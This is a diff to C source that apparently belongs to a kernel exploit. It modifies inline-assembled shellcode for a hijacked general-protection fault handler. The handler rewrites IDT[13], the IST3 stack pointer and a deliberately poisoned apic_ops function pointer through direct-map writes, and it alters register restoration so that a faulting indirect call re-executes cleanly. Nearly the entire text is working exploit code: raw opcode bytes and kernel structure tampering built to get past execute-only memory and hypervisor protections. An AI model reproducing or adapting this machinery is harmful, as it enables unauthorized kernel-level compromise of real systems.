@@ -6167,23 +6167,29 @@ static void campaign_flatz_setup(void) {
         usleep(100000);  /* 100ms — guarantees context switch + CR3 reload */
         printf("[+] TLB flush complete\n");
 
-        /* ── Build #GP handler machine code inline (88 bytes) ──
+        /* ── Build #GP handler machine code inline (87 bytes) ──
          *
          * Handler addresses (baked in, no relocations):
          *   idt_backup_addr  = cave_kva + 0x100 (kdata VA, readable)
          *   idt13_dmap_addr  = DMAP addr of IDT[13] (writable)
-         *   orig_xapic_value = ops[2] VALUE (not an address)
-         *   apic_ops2_dmap   = DMAP addr of apic_ops[2] (writable)
          *   orig_ist3_value  = original IST3 VALUE (baked in)
          *   ist3_dmap_addr   = DMAP addr of TSS IST3 (writable)
+         *   orig_xapic_value = ops[2] VALUE (not an address)
+         *   apic_ops2_dmap   = DMAP addr of apic_ops[2] (writable)
          *
          * NO ktext reads — ktext is XOM under NPT, reading it crashes.
          * All writes go through DMAP (same PAs, NPT allows RW).
          *
-         * Handler restores THREE things:
+         * Handler restores THREE things (order matters!):
          *   1. IDT[13] — original handler (from cave backup)
-         *   2. apic_ops[2] — original xapic_mode pointer
-         *   3. IST3 — original stack (so future #GPs use proper stack)
+         *   2. IST3 — original stack (so future #GPs use proper stack)
+         *   3. apic_ops[2] — original xapic_mode pointer (LAST)
+         *
+         * apic_ops[2] restore is LAST so rax ends up holding the valid
+         * xapic_mode pointer.  The faulting instruction is 'call rax'
+         * with the poisoned non-canonical value.  We skip 'pop rax'
+         * so rax keeps the valid value → IRETQ re-executes the call
+         * successfully.  add $16 skips both saved rax and error code.
          *
          * Machine code:
          *   push rax; push rcx; push rsi; push rdi; cld
@@ -6191,14 +6197,14 @@ static void campaign_flatz_setup(void) {
          *   movabs $idt13_dmap_addr, %rdi
          *   mov $16, %ecx
          *   rep movsb
-         *   movabs $orig_xapic_value, %rax
-         *   movabs $apic_ops2_dmap, %rdi
-         *   mov %rax, (%rdi)
          *   movabs $orig_ist3_value, %rax
          *   movabs $ist3_dmap_addr, %rdi
          *   mov %rax, (%rdi)
-         *   pop rdi; pop rsi; pop rcx; pop rax
-         *   add $8, %rsp     ; pop error code
+         *   movabs $orig_xapic_value, %rax
+         *   movabs $apic_ops2_dmap, %rdi
+         *   mov %rax, (%rdi)
+         *   pop rdi; pop rsi; pop rcx
+         *   add $16, %rsp    ; skip saved rax + error code
          *   iretq
          */
         uint64_t idt_backup_addr  = cave_kva + 0x100;
@@ -6222,6 +6228,8 @@ static void campaign_flatz_setup(void) {
         /* cld */
         handler_code[hc++] = 0xFC;
 
+        /* 1. Restore IDT[13]: rep movsb 16 bytes from backup → IDT */
+
         /* movabs $idt_backup_addr, %rsi */
         handler_code[hc++] = 0x48; handler_code[hc++] = 0xBE;
         memcpy(&handler_code[hc], &idt_backup_addr, 8); hc += 8;
@@ -6238,17 +6246,7 @@ static void campaign_flatz_setup(void) {
         /* rep movsb */
         handler_code[hc++] = 0xF3; handler_code[hc++] = 0xA4;
 
-        /* movabs $orig_xapic_value, %rax */
-        handler_code[hc++] = 0x48; handler_code[hc++] = 0xB8;
-        memcpy(&handler_code[hc], &orig_xapic_value, 8); hc += 8;
-
-        /* movabs $apic_ops2_dmap, %rdi */
-        handler_code[hc++] = 0x48; handler_code[hc++] = 0xBF;
-        memcpy(&handler_code[hc], &apic_ops2_dmap, 8); hc += 8;
-
-        /* mov %rax, (%rdi)  — restore apic_ops[2] */
-        handler_code[hc++] = 0x48; handler_code[hc++] = 0x89;
-        handler_code[hc++] = 0x07;
+        /* 2. Restore IST3 (before apic_ops so rax ends up valid) */
 
         /* movabs $orig_ist3_value, %rax */
         handler_code[hc++] = 0x48; handler_code[hc++] = 0xB8;
@@ -6262,18 +6260,32 @@ static void campaign_flatz_setup(void) {
         handler_code[hc++] = 0x48; handler_code[hc++] = 0x89;
         handler_code[hc++] = 0x07;
 
+        /* 3. Restore apic_ops[2] LAST — rax = valid xapic_mode ptr */
+
+        /* movabs $orig_xapic_value, %rax */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xB8;
+        memcpy(&handler_code[hc], &orig_xapic_value, 8); hc += 8;
+
+        /* movabs $apic_ops2_dmap, %rdi */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0xBF;
+        memcpy(&handler_code[hc], &apic_ops2_dmap, 8); hc += 8;
+
+        /* mov %rax, (%rdi)  — restore apic_ops[2] */
+        handler_code[hc++] = 0x48; handler_code[hc++] = 0x89;
+        handler_code[hc++] = 0x07;
+
         /* pop rdi */
         handler_code[hc++] = 0x5F;
         /* pop rsi */
         handler_code[hc++] = 0x5E;
         /* pop rcx */
         handler_code[hc++] = 0x59;
-        /* pop rax */
-        handler_code[hc++] = 0x58;
+        /* Skip pop rax — keep rax = valid xapic_mode pointer.
+         * The faulting 'call rax' re-executes with the correct value. */
 
-        /* add $8, %rsp  (pop error code pushed by #GP) */
+        /* add $16, %rsp  (skip saved rax + error code pushed by #GP) */
         handler_code[hc++] = 0x48; handler_code[hc++] = 0x83;
-        handler_code[hc++] = 0xC4; handler_code[hc++] = 0x08;
+        handler_code[hc++] = 0xC4; handler_code[hc++] = 0x10;
 
         /* iretq */
         handler_code[hc++] = 0x48; handler_code[hc++] = 0xCF;
